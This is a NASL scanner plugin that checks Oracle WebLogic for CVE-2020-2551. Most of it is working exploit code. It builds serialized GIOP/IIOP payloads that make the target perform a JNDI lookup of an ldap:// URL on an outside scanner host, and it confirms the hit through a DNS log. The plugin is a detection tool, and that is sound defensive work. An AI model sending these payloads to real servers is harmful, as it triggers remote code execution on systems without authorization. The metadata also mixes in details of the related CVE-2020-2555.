include("compat.inc");

if (description)
{
  script_id(51799350);
  script_version("1.9");
  script_cvs_date("Date: 2020/01/15 19:07:47");

  script_cve_id("CVE-2020-2551");

  script_name(english:"Oracle Fusion Middleware Coherence && WebLogic Remote Code Execution");
  script_summary(english:"Sends an HTTP POST request and ping response");

  script_set_attribute(attribute:"synopsis", value:
"The remote Oracle Coherence or WebLogic server is affected by a remote code
execution vulnerability.");
  script_set_attribute(attribute:"description", value:"Vulnerability in the Oracle Coherence product of Oracle Fusion Middleware (component: Caching,CacheStore,Invocation). Supported versions that are affected are 10.3.6.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle Coherence. Successful attacks of this vulnerability can result in takeover of Oracle Coherence. ");
  # http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html#AppendixFMW
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch according to the Oracle
Critical Patch Update advisory : https://www.oracle.com/security-alerts/cpujan2020.html .");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"risk_factor", value:"High");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"Copyright (C) 2004-2020 WebRAY");

  script_dependencies("weblogic_2555_local.nasl");
  script_require_ports("Services/t3", 7001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");



port = get_service(svc:'t3', default:7001, exit_on_fail:TRUE);
version = get_kb_item("www/weblogic/" + port + "/version");


if(get_kb_item("CVE_2020_2555_local")) {
	security_hole(port:port, data:"Find Vulnerable CVE-2020-2551");
	exit(0);
}

laddress = compat::this_host();
pattern = rand_str(length:8);


ping_cmd = "ldap://"+ pattern + ".scanner.webpulse.cn/Exploit";


cmdlen = strlen(ping_cmd);

sock = open_sock_tcp(port, timeout:15);
if (!sock)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}


serObj_1 = serObj_1 = hex2raw(s:"47494f50010200030000001700000002000000000000000b4e616d6553657276696365");
send(socket:sock, data:serObj_1);
data = recv(socket:sock, length:2048, timeout:5);

if("GIOP">< data){
	pre_real_addr = eregmatch(pattern:"68747470(..|)3a(\w+)2f6265615f77", string:hexstr(data));
	real_addr = eregmatch(pattern:"//([\d\.:]+)/", string:hex2raw(s:pre_real_addr[2]));
	
	get_address = eregmatch(pattern:"00000078(\w{240})", string:hexstr(data));
	
	
	serObj_2 =  hex2raw(s:"47494f50010200000000");
	
	serObj_2_1 = hex2raw(s:"00000003030000000000000000000078"+get_address[1]+"0000000e5f6e6f6e5f6578697374656e7400000000000006000000050000001800000000000000010000000a3132372e302e312e3100d80100000006000000f0000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000100000000000000b4000102000000000a3132372e302e312e3100d8010000006400424541080103000000000100000000000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000331320000000000014245412c000000100000000000000000171db96932f5c18300000001000000010000002c0000000000010020000000030001002000010001050100010001010000000003000101000001010905010001000000010000000c0000000000010020050100010000000f0000002000000000000000000000000000000001000000000000000001000000000000004245410000000005000c0201030000004245410e000000");

	str_1 = hex2raw(s:"69696f703a2f2f");
	read_ip = raw_string(real_addr[1]);
	str_2 = hex2raw(s:"00");
	len_str = raw_string(strlen(str_1+read_ip+str_2));
	
	iiop_lem = raw_string(strlen(str_1+read_ip+str_2)+8);
	
	serObj_2_1 += iiop_lem+ hex2raw(s:"00000000000000");
	serObj_2_1 += len_str+str_1+read_ip+str_2;
	
	size2 = hex2raw(s:(int2hex(num:strlen(serObj_2_1))));
	serObj_2 = serObj_2+size2+serObj_2_1;
	
	send(socket:sock, data:serObj_2);
	
	data2 = recv(socket:sock, length:2048, timeout:5);
	
	if("00000078" >< hexstr(data2)){
		get_address2 = eregmatch(pattern:"00000078(\w{240})", string:hexstr(data2));
		padd = get_address2[1];
	}else{
		padd = get_address[1];
	}
	
	
	serObj_3 = hex2raw(s:"47494f50010200000000");
	
	serObj_3_1 = hex2raw(s:"00000004030000000000000000000078"+padd+"0000000e5f6e6f6e5f6578697374656e74000000000000014245410e000000");
	
	serObj_3_1 += iiop_lem+ hex2raw(s:"00000000000000");
	
	serObj_3_1 += len_str+str_1+read_ip+str_2;
	
	size3 = hex2raw(s:(int2hex(num:strlen(serObj_3_1))));
	
	serObj_3 = serObj_3+size3+serObj_3_1;
	
	send(socket:sock, data:serObj_3);
	
	sleep(1);
	
	if (version =~ "^12\.2"){
	
		serObj_4  = hex2raw(s:"47494f50010200000000");
		
		serObj_4_1 = hex2raw(s:"00000005030000000000000000000078"+padd+"0000000962696e645f616e790000000000000000000000010000000568656c6c6f00000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a413235363030344146343946393942343a3143464133393637334232343037324400ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000");
		
		serObj_4_1 += raw_string(cmdlen) + raw_string(ping_cmd);
		
		exp_len = hex2raw(s:(int2hex(num:strlen(serObj_4_1))));
		
		serObj_4 = serObj_4+exp_len+serObj_4_1;
		
		send(socket:sock, data:serObj_4);
		
		sleep(1);
		
		close(sock);
		report ="[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
		security_hole(port:port, extra:report);

	}else{
		serObj_4  = hex2raw(s:"47494f50010200000000");
		
		serObj_4_1 = hex2raw(s:"00000005030000000000000000000078"+padd+"0000000962696e645f616e790000000000000000000000010000000568656c6c6f00000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a304433303438453037423144334237423a3445463345434642423632383938324600ffffffff0001010000000000000001010101000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000");
		
		serObj_4_1 += raw_string(cmdlen) + raw_string(ping_cmd);
		
		exp_len = hex2raw(s:(int2hex(num:strlen(serObj_4_1))));
		
		serObj_4 = serObj_4+exp_len+serObj_4_1;
		
		send(socket:sock, data:serObj_4);
		
		sleep(1);
		
		close(sock);
		report ="[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
		security_hole(port:port, extra:report);
	}

}

close(sock);
exit(0);
